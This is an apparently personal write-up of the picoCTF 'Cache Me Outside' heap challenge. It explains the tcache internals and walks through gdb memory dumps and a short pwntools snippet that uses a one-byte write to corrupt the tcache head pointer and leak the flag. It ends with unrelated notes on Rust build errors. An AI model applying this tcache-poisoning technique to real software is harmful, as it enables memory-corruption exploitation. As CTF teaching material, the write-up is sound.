# PicoCTF: Cache Me Outside

## TL;DR:

The flag value is read from a file in the current directory and stored in both a
local stack buffer and also copied to several heap allocated structs.

The program gives the user the ability to give an arbitrary value to any single
byte in the process's address space, thus simulating an arbitrary 1-byte write.

The exploitation approach is to modify a pointer within the tcache linked list
of `free()`ed allocations so that a subsequent call to `malloc()`returns the
address an existing heap allocation containing the flag value.

Techniques
- Binary reverse engineering
- Heap feng shui: tcache internals

Mitigations
- ASLR is disabled for the main binary and enabled for shared libraries, but an
  explicit ASLR defeat is not required.

## Notes

### First contact

Upon connecting to the challenge server, it prompts for an address and a 1-byte
value that it will write to the supplied address.

Questions
- What address should be changed?
- Which value will cause the right effect?

### tcache

The challenge's hint suggested reading up on tcache. After reading this [tcache
attack
explanation](https://guyinatuxedo.github.io/29-tcache/tcache_explanation/index.html)
I suspected the goal was to use the 1-byte overwrite to somehow point the next
chunk pointer from a recently `free()`ed allocation at the memory address
containing the flag value.

### Reversing `heapedit`

Since the challenge did not provide source for the `heapedit` binary, and I felt
a bit lost, I used Ghidra to analyze and decompile the binary to get an idea of
what the binary is doing in hopes it would provide clues about the address and
value I should supply to get the flag. Mercifully the binary is tiny, and all
its logic is contained in `main()`.

It's here we learn the flag value value is read a file called `flag.txt` into a
stack buffer. So the address of this variable holds the flag value, but how to
get the address?

From the supplied `Makefile` we see `heapedit` binary is a 64-bit executable
built with `-no-pie`. Thus it will be loaded into memory at 0x400000. Ghidra
already figured this out and fixed up the addresses accordingly. Usually Ghidra
just guesses at the base load address, but in this case we should be able to
trust it.

The flag value is copied into a buffer on the stack and then into several
heap-allocated objects. So even though we know the base address of the
executable that doesn't tell us where the stack or heap variables are.

The stack was in the same place on multiple local runs within gdb:

```
 RAX  0x7fffffffdb60 ◂— 'picoCTF{FLAGFLAGFLAGFLAGFLAG}\n'
 RBX  0x0
*RCX  0x11
*RDX  0x602340 ◂— 0x0
*RDI  0x7fffffffdb61 ◂— 'icoCTF{FLAGFLAGFLAGFLAGFLAG}\n'
*RSI  0x7fffffffdb60 ◂— 'picoCTF{FLAGFLAGFLAGFLAGFLAG}\n'
```

That's a red herring. ASLR might be disabled in gdb. And there's another thing:

The address we supply is relative, i.e. it's an offset rather than an absolute
address:

```
*(char *)((long)&current_entry->field0_0x0 + (long)target_address) = target_value;
```

A constraint: Although only 1 byte is written, writes are 8-byte/64-bit aligned
because `target_address` is cast to a long, which is 8 bytes on 64-bit
architectures.

### Where to write

From the [tcache attack
explanation](https://guyinatuxedo.github.io/29-tcache/tcache_explanation/index.html),
it would be handy if we had two `malloc()`s because then we could just modify the tcache
pointer stored in the `free()`ed entry to point at the flag as in the
explanation. However, `heapedit` only has a single `free()` so we have to do
something different.

Since tcache entries are a singly linked list there has to be a head entry
somewhere which points to the first entry.

Included in pwntools is the `heap` command, which produces output like this:

```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x602000
Size: 0x251

Allocated chunk | PREV_INUSE
Addr: 0x602250
Size: 0x231

Allocated chunk | PREV_INUSE
Addr: 0x602480
Size: 0x1011

Allocated chunk | PREV_INUSE
Addr: 0x603490
Size: 0x91

Allocated chunk | PREV_INUSE
Addr: 0x603520
Size: 0x91

Allocated chunk | PREV_INUSE
Addr: 0x6035b0
Size: 0x91

Allocated chunk | PREV_INUSE
Addr: 0x603640
Size: 0x91

Allocated chunk | PREV_INUSE
Addr: 0x6036d0
Size: 0x91

Allocated chunk | PREV_INUSE
Addr: 0x603760
Size: 0x91

Free chunk (tcache) | PREV_INUSE
Addr: 0x6037f0
Size: 0x91
fd: 0x00

Free chunk (tcache) | PREV_INUSE
Addr: 0x603880
Size: 0x91
fd: 0x603800

Allocated chunk | PREV_INUSE
Addr: 0x603910
Size: 0x411

Top chunk | PREV_INUSE
Addr: 0x603d20
Size: 0x1f2e1
```

The first few allocations are a mystery; they occur not as a direct result of
code in `heapedit`'s `main()`, but rather likely due to glibc initialization.
However, the last few are our 8 structs. The first 7 contain a copy of the flag
value while the last has a decoy payload.

After the last  `new_entry` (annotated as `>1`) and the `top_entry` (annotated
as `>2`) are both `free()`ed, they look like this on the heap:

```
pwndbg> x/192gx 0x603490
...
0x603800:    1> 0x0000000000000000      0x662072756f592021
0x603810:       0x203a73692067616c      0x7b4654436f636970
0x603820:       0x47414c4647414c46      0x47414c4647414c46
0x603830:       0x00000a7d47414c46      0x0000000000000000
0x603840:       0x0000000000000000      0x0000000000000000
0x603850:       0x0000000000000000      0x0000000000000000
0x603860:       0x0000000000000000      0x0000000000000000
0x603870:       0x0000000000000000      0x0000000000000000
0x603880:       0x0000000000000000      0x0000000000000091
0x603890:    2> 0x0000000000603800      0x276e6f7720736968
0x6038a0:       0x7920706c65682074      0x73696874203a756f
0x6038b0:       0x6172206120736920      0x727473206d6f646e
0x6038c0:       0x000000002e676e69      0x0000000000000000
...
```

Note how the latter `free()`ed allocation starts with a pointer to the former.
This is the tcache LIFO linked list.

So what points to the first entry in the list? Might there be a pointer to it
somewhere?

We can see the program's memory segments with pwntool's `vmmap` command:

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /cache_me_outside/heapedit_patched
          0x600000           0x601000 r--p     1000 0      /cache_me_outside/heapedit_patched
          0x601000           0x602000 rw-p     1000 1000   /cache_me_outside/heapedit_patched
          0x602000           0x623000 rw-p    21000 0      [heap]
    0x7ffff79e4000     0x7ffff7bcb000 r-xp   1e7000 0      /cache_me_outside/libc.so.6
    0x7ffff7bcb000     0x7ffff7dcb000 ---p   200000 1e7000 /cache_me_outside/libc.so.6
    0x7ffff7dcb000     0x7ffff7dcf000 r--p     4000 1e7000 /cache_me_outside/libc.so.6
    0x7ffff7dcf000     0x7ffff7dd1000 rw-p     2000 1eb000 /cache_me_outside/libc.so.6
    0x7ffff7dd1000     0x7ffff7dd5000 rw-p     4000 0      [anon_7ffff7dd1]
    0x7ffff7dd5000     0x7ffff7dfc000 r-xp    27000 0      /cache_me_outside/ld-2.27.so
    0x7ffff7ff4000     0x7ffff7ff6000 rw-p     2000 0      [anon_7ffff7ff4]
    0x7ffff7ff6000     0x7ffff7ffa000 r--p     4000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 27000  /cache_me_outside/ld-2.27.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 28000  /cache_me_outside/ld-2.27.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]
```

From `vmmap` we can see the heap resides from 0x602000 to 0x623000, so let's
search this region for the pointer of interest using `find`:

```
pwndbg> find /4 0x600000,0x623000,0x603890
0x602088
warning: Unable to access 7029 bytes of target memory at 0x62148c, halting search.
1 pattern found.
```

That's interesting. If we modify this pointer to an existing heap allocation
containing the flag, then I bet `malloc()` could be tricked in to creating a new
allocation there and it would dump the flag.

If want to modify the pointer at 0x602088, we can't just enter that value when
prompted because whatever value we enter will be added to the address of
`first_entry`. And besides, `first_entry` resides at a higher memory address
than the location of our target. Would `scanf(%d)` correctly interpret a
negative value, which would allow us to seek backwards to lower address? Only
one way to be sure... But how are to seek back? Cacluator says `0x6034a0 − 0x602088 = 5144`.

Supplying `-5144` when prompted then entering `A` and re-inspecting the memory
at the target pointer and *boom* it worked. Except the target pointer's value is
now 0x603841, which is invalid.

### What to write

Happily, there's a valid chunk at 0x603800 that conatins a key. This is handy
because writing 0s to the last byte of the existing address will land us on a
chunk containing the flag.

Fire up `nc`, suply the offset of -5144 and enter `0`. That didn't work. Let's
look at the modified pointer, which now has the value of 0x603830. That's odd,
how did 0 become 0x30? Doh, ASCII conversion! It's an ASCII zero, not the native
raw value of zero. How do we send a raw zero? pwntools to the rescue:

```
r.sendline(b"-5144")
r.sendline(b"\x00")
```

Et voila. The flag falls out.

### Incidentally...

- Running `heapedit` in gdb, pressing `Ctrl+D` resulted in successfully printing
the dummy flag.
- The `scanf` man page says `%c` only accept non-whitespace, but boy
howdy it sure ate up the `b"\x00"` sent from pwntool's solution script.

## Hint: Running heapedit locally

Attempts to run the provided `heapedit` binary failed on both my local Ubuntu
environment as well as the PicoCTF webshell.

On my local Ubuntu system I got the following error:

```
kavefish@cairn:cache_me_outside/ (main*) $ ./heapedit
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
```

And running the on the PicoCTF webshell simply segfaulted.

I used [this writeup](https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Cache_Me_Outside.md#running-the-binary-locally) for a hint to use `pwninit` to overcome linker/loader problems.

The `pwninit` tool detects the challenge binary and its requirements for both
linker and loader versions, downloads them as needed, and patches a copy of the
binary to use the downloaded linker and/or loader. It also creates a convenience
`pwntools` script to invoke the binary with the supplied linker and loader.

## References

### Attacking tcache

https://guyinatuxedo.github.io/29-tcache/tcache_explanation/index.html

### Position Independent Executables

https://www.redhat.com/en/blog/position-independent-executables-pie

### Ghidra: Defining Structures

https://www.tripwire.com/state-of-security/security-data-protection/ghidra-101-creating-structures-in-ghidra/

## Tangential

### Rust

When installing a Rust Crate via `cargo`, a build step failed with a cryptic
error:

```
... Could not find liblzma using pkg-config ...
```

Turns out the solution was to use the Ubuntu packagage mananger to install
`liblzma-dev`. That means Crate builds can rely on system libraries/binaries.

Next, when first running the Rust binary installed via `cargo`, the binary
failed with an error complaining that `patchelf` wasn't found:

```
error: failed patching binary: patchelf failed to start; please install patchelf: No such file or directory (os error 2)
```

This is an example of a Rust binary invoking a system binary, e.g. `system()`.